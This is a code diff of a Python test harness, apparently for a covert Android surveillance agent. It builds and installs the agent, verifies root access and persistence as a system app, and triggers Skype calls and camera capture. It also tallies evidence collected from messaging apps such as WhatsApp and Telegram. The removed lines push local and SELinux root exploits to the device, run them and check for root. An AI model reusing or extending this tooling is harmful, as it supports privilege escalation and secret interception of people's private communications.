@@ -7,7 +7,7 @@ import inspect
 import traceback
 import collections
 import datetime
-import adb
+
 import argparse
 import commands_device
 from scripts.mobile.hardware.commands_device import CommandsDevice
@@ -23,63 +23,27 @@ service = 'com.android.dvci'
 def say(text):
     os.system("say " + text)
 
+def check_install(command_dev, results):
+    if command_dev.check_infection():
+        command_dev.uninstall_agent()
 
-def check_exploit(dev, results):
-    for f in ["expl_check", "local_exploit", "selinux_check", "selinux_exploit", "check.sh"]:
-        adb.copy_tmp_file("assets/exploit/%s" % f, dev)
-        adb.execute("chmod 755 /data/local/tmp/in/%s" % f, dev)
-    check = adb.execute("/data/local/tmp/in/check.sh", dev)
-    results["check_exploit"] = check.split()
-    if "LOCAL" in check:
-        ret_local = adb.execute("/data/local/tmp/in/local_exploit id", dev)
-        print "Testing LOCAL: ", ret_local
-        results["exploit_local"] = "root" in ret_local
-    if "SELINUX" in check:
-        ret_selinux = adb.execute("/data/local/tmp/in/selinux_exploit id", dev)
-        print "Testing SELINUX: ", ret_selinux
-        results["exploit_selinux"] = "root" in ret_selinux
-
-
-def check_install(dev, results, factory=None):
-
-    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
-    res += adb.execute('pm path com.android.deviceinfo')
-    res += adb.execute('pm path com.android.dvci')
-
-    if res:
-        adb.execute("ddf ru", dev)
-        # uninstall device
-        adb.uninstall(service, dev)
-
-    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
-    res += adb.execute('pm path com.android.deviceinfo')
-    res += adb.execute('pm path com.android.dvci')
-
-    if res:
-        print "Error, still installed: " + res
+    still_infected = command_dev.check_infection()
+    if still_infected:
+        print "Error, still installed"
         return False
 
-    results["packages_remained"] = res
+    results["packages_remained"] = still_infected
+    return True
 
+def install(command_dev, results):
     if results['release'].startswith("2"):
-        apk = apk_template % "v2"
+        agent = "agent_v2"
     else:
-        apk = apk_template % "default"
-    # apk = apk_template % "default"
+        agent = "agent"
 
-    # print "... building %s" % apk
-
-    # if not os.path.isfile(apk):
-    # if not commands.build_apk("silent", "castore", factory):
-    # return False
-
-    if not os.path.isfile(apk):
-        print "not existent file: %s" % apk
-        return False
-
-    print "... installing %s" % apk
+    print "... installing %s" % agent
     # install
-    if not adb.install(apk, dev):
+    if not command_dev.install(agent):
         return False
 
     results["installed"] = True
@@ -87,49 +51,8 @@ def check_install(dev, results, factory=None):
     return True
 
 
-def execute_agent(dev, results):
-    processes = adb.ps(dev)
-    running = service in processes
-    if not running:
-        if not adb.executeMonkey(service, dev):
-            return False
-        else:
-            results["executed"] = True;
-            print "executed: OK"
 
-    # check for running
-    time.sleep(3)
-    processes = adb.ps(dev)
-    running = service in processes
-
-    if not running:
-        if not adb.executeService(service, dev):
-            return False
-        else:
-            results["executed"] = True;
-            print "executed: OK"
-
-    time.sleep(3)
-    processes = adb.ps(dev)
-    running = service in processes
-    assert running
-
-    say("agent installed, verify root request")
-    return True
-
-def check_su(dev, results):
-    packages = adb.get_packages(dev)
-    supack = ["supersu", "superuser"]
-    if "com.noshufou.android.su" in packages:
-        results["su"] = "noshufou"
-    else:
-        ret_su = adb.execute("su -v", dev)
-        results["su"] = ret_su
-
-    print "Has SU: ", results["su"]
-
-
-def check_evidences(dev, c, results, timestamp=""):
+def check_evidences(command_dev, c, results, timestamp=""):
 
     time.sleep(60)
     evidences, kinds = c.evidences()
@@ -152,10 +75,10 @@ def check_evidences(dev, c, results, timestamp=""):
     results['evidences' + timestamp] = ev
     results['evidence_types' + timestamp] = kinds.keys()
 
-    results['uptime' + timestamp] = adb.execute("uptime", dev)
+    results['uptime' + timestamp] = command_dev.get_uptime()
 
     expected = set()
-    packages = adb.get_packages(dev)
+    packages = command_dev.get_packages()
     for i in ['skype', 'facebook', 'wechat', 'telegram', 'hangout', 'android.talk', 'line.android', 'viber',
               'tencent.mm', 'whatsapp']:
         for p in packages:
@@ -165,21 +88,15 @@ def check_evidences(dev, c, results, timestamp=""):
     results['expected'] = list(expected)
 
 
-def uninstall_agent(dev, c, results):
+def uninstall_agent(commands_device, c, results):
     c.uninstall()
 
-    #calc = [f.split(":")[1] for f in adb.execute("pm list packages calc", dev).split() if f.startswith("package:")][0]
-    #packages = adb.get_packages(dev)
-    #calc = [ p for p in packages if "calc" in p and not "localc" in p][0]
-    #print "... executing calc: %s" % calc
-    #adb.executeMonkey(calc, dev)
-    #time.sleep(5)
     say("agent uninstall, verify request")
 
     for i in range(12):
         time.sleep(10)
 
-        processes = adb.ps(dev)
+        processes = commands_device.get_processes()
         uninstall = service not in processes
         if uninstall:
             break
@@ -189,32 +106,32 @@ def uninstall_agent(dev, c, results):
     if not uninstall:
         print "uninstall: ERROR"
         print "processes: %s" % processes
-        adb.uninstall(service, dev)
+        commands_device.uninstall_agent()
     else:
         print "uninstall: OK"
 
 
-def check_uninstall(dev, results, reboot = True):
+def check_uninstall(commands_device, results, reboot = True):
     if reboot:
         print ".... reboot"
-        adb.reboot(dev)
+        commands_device.reboot()
         time.sleep(60)
 
-    processes = adb.ps(dev)
+    processes = commands_device.get_processes()
     running = "still running: %s" % service in processes
     results['running'] = running
 
-    res = adb.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
+    res = commands_device.execute("ls /sdcard/1 /sdcard/2 /system/bin/debuggered /system/bin/ddf /data/data/com.android.deviceinfo/ /data/data/com.android.dvci/ /sdcard/.lost.found /sdcard/.ext4_log /data/local/tmp/log /data/dalvik-cache/*StkDevice*  /data/dalvik-cache/*com.android.dvci* /data/app/com.android.dvci*.apk /system/app/StkDevice*.apk 2>/dev/null")
     results["files_remained"] = res
 
     #res = adb.executeSU('cat /data/system/packages.list  | grep -i -e "dvci" -e "deviceinfo" -e "StkDevice"')
     #res += adb.executeSU('cat /data/system/packages.xml  | grep -i -e "dvci" -e "device" -e "StkDevice"')
-    res = adb.execute('pm path com.android.deviceinfo')
-    res += adb.execute('pm path com.android.dvci')
+    res = commands_device.execute('pm path com.android.deviceinfo')
+    res += commands_device.execute('pm path com.android.dvci')
 
     results["packages_remained"] = res
 
-def check_skype(dev, c, results):
+def check_skype(command_dev, c, results):
     supported = ['4.0', '4.1', '4.2', '4.3']
     release = results['release'][0:3]
 
@@ -238,37 +155,31 @@ def check_skype(dev, c, results):
 
     for i in range(10):
         time.sleep(10)
-        ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4", True, dev)
+        ret = command_dev.execute_root("ls /data/data/com.android.dvci/files/l4")
         print ret
         if "No such file" not in ret:
             print "Skype call and sleep"
-            adb.skype_call(dev)
+            command_dev.skype_call()
             time.sleep(90)
-            ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4", True, dev)
+            ret = command_dev.execute_root("ls /data/data/com.android.dvci/files/l4")
             print ret
             break
 
 
-def check_camera(dev):
-    adb.press_key_home(dev)
-    adb.execute("am start -a android.media.action.IMAGE_CAPTURE", dev)
+def check_camera(command_dev):
+    command_dev.press_key_home()
+    command_dev.execute("am start -a android.media.action.IMAGE_CAPTURE")
     time.sleep(10)
 
 
-def set_time(dev):
-    t = time.localtime()
-    adb.execute('date -s %04d%02d%02d.%02d%02d%02d' % (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec),
-                dev)
-
-
-def set_properties(dev, device_id, results):
+def set_properties(command_dev, results):
     # getprop device
-    props = adb.get_properties(dev)
+    props = command_dev.get_properties()
     device = "%s %s" % (props["manufacturer"], props["model"])
 
     results['time'] = "%s" % datetime.datetime.now()
     results['device'] = device
-    results['id'] = device_id
+    results['id'] = command_dev.get_dev_deviceid()
     results['release'] = props["release"]
     results['selinux'] = props["selinux"]
     results['build_date'] = props["build_date"]
@@ -277,28 +188,23 @@ def set_properties(dev, device_id, results):
     return results
 
 
-def check_reboot(dev, results, delay = 60):
-    print "... reboot"
-    adb.reboot(dev)
-    time.sleep(delay)
-
-def check_persistence(c, dev, results, delay = 30):
+def check_persistence(c, command_dev, results, delay = 30):
     print "... reboot and check persistence"
-    adb.press_key_home(dev)
+    command_dev.press_key_home()
 
-    if not adb.check_remote_file("StkDevice.apk", "/system/app", timeout=30, device=dev):
+    if not command_dev.check_remote_file("StkDevice.apk", "/system/app", timeout=30):
         results["persistence"] = "No";
 
-    adb.reboot(dev)
+    command_dev.reboot()
     time.sleep(delay)
 
     c.wait_for_start(2)
 
-    adb.set_screen_on_and_unlocked(dev)
+    command_dev.unlock()
 
-    ret = adb.execute("ls /system/app/StkDevice.apk")
+    ret = command_dev.execute("ls /system/app/StkDevice.apk")
 
-    inst = adb.execute("pm path com.android.dvci")
+    inst = command_dev.execute("pm path com.android.dvci")
     if "/data/app/" in inst:
         if "No such file" in ret:
             results["persistence"] = "No";
@@ -310,24 +216,20 @@ def check_persistence(c, dev, results, delay = 30):
     else:
         results["persistence"] = "Error";
 
-def test_device(id, dev, args, results):
+def test_device(id, command_dev, args, results):
 
     if args.fastnet:
-        wifiutils.install_wifi_enabler(dev)
-        commands_dev = CommandsDevice(dev_serialno=dev)
-        commands_dev.wifi('open', check_connection=False)
-        wifiutils.uninstall_wifi_enabler(dev)
+        command_dev.wifi('open', check_connection=False, install=True)
         exit(0)
 
     if args.reboot:
-        adb.reboot(dev)
+        command_dev.reboot()
 
     #tests = ["sync","persistence","root", "skype","camera"]
     #tests = ["persistence"]
 
     demo = True
-
-    device_id = adb.get_deviceid(dev)
+    device_id = command_dev.get_dev_deviceid()
 
     commands_rcs = CommandsRCS(host = "192.168.100.100", login_id = id, device_id = device_id, operation = "Rite_Mobile", target_name = "HardwareFunctional", factory = 'RCS_0000002050')
 
@@ -343,12 +245,14 @@ def test_device(id, dev, args, results):
         f.write(config)
         f.close()
 
+        # push new conf
         os.system('echo ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -c build/config.upload.json' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory))
 
         if demo:
             json = "build.demo.json"
         else:
             json = "build.nodemo.json"
+        # build
         os.system(
             'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json))
         os.system('unzip -o  and.zip -d assets')
@@ -357,70 +261,68 @@ def test_device(id, dev, args, results):
         print "ERROR, cannot build apk"
         exit(0)
 
-    set_time(dev)
-    set_properties(dev, device_id, results)
+    command_dev.sync_time()
+    set_properties(command_dev, results)
 
-    adb.set_screen_on_and_unlocked(dev)
+    command_dev.unlock_screen()
 
     try:
         with commands_rcs as c:
             commands_rcs.delete_old_instance()
 
             # install agent and check it's running
-            if not check_install(dev, results):
-                return "installation failed"
+            if check_install(command_dev, results):
+                install(command_dev, results)
 
-            if not execute_agent(dev, results):
+            results["executed"] = command_dev.execute_agent()
+            if not results["executed"]:
                 return "execution failed"
 
-            adb.press_key_home(dev)
+            command_dev.press_key_home()
 
             # sync e verifica
             c.wait_for_sync()
 
             # rename instance
-
             results['instance_name'] = c.rename_instance(results['device'])
 
             # check for root
-            check_su(dev, results)
+            results["su"] = command_dev.info_root()
 
             result, root, info = c.check_root()
             results['root'] = root
             results['root_first'] = result
-            check_evidences(dev, c, results, "_first")
+            check_evidences(command_dev, c, results, "_first")
 
             time.sleep(20)
+            check_persistence(command_dev, c, results)
 
             result, root, info = c.check_root()
             time.sleep(30)
 
             if result:
                 # skype call
-                check_skype(dev, c, results)
+                check_skype(command_dev, c, results)
 
                 # check camera
-                check_camera(dev)
+                check_camera(command_dev)
 
             # evidences
-            check_evidences(dev, c, results, "_last")
+            check_evidences(command_dev, c, results, "_last")
 
         if args.interactive:
             say("press enter to uninstall %s" % id)
             ret = raw_input("... PRESS ENTER TO UNINSTALL\n")
 
         # uninstall
-        uninstall_agent(dev, c, results)
+        uninstall_agent(command_dev, c, results)
 
         # check uninstall after reboot
-        check_uninstall(dev, results)
+        check_uninstall(command_dev, results)
 
     except Exception, ex:
         traceback.print_exc(device_id)
         results['error'] = "%s" % ex
-
-    if args.fastnet:
-        commands.uninstall('wifi_enabler', dev)
 
 
 def report_if_exists(results, param):
@@ -491,44 +393,21 @@ def main():
     # from AVCommon import logger
     # logger.init()
 
-    devices = adb.get_attached_devices()
-
-    print """ prerequisiti:
-    1) Telefono connesso in USB,
-    2) USB Debugging enabled (settings/developer options/usb debugging)
-    3) connesso wifi a RSSM
-    4) screen time 10m (settings/display/sleep)
-    """
+    command_dev =  CommandsDevice()
 
     args = parse_args()
-
-
-    print "devices connessi:"
-    for id in range(len(devices)):
-        print "%s) %s" % (id, devices[id][1])
-
-    dev = None
-    id = 0
     results = collections.OrderedDict()
 
-    if not devices:
-        print "non ci sono device connessi"
-    else:
-        if len(devices) > 1:
-            id = raw_input("su quale device si vuole eseguire il test? ")
-            dev = devices[int(id)][0]
-            print "eseguo il test su %s" % dev
+    try:
+        test_device(id, command_dev, args, results)
+    except Exception, ex:
+        print ex
+        traceback.print_exc()
+        results['exception'] = ex
 
-        try:
-            test_device(id, dev, args, results)
-        except Exception, ex:
-            print ex
-            traceback.print_exc()
-            results['exception'] = ex
-
-        print results
-        report = report_test_rail(results)
-        report_files(results, report)
+    print results
+    report = report_test_rail(results)
+    report_files(results, report)
 
     print "Fine."
     say("test ended %s" % id)
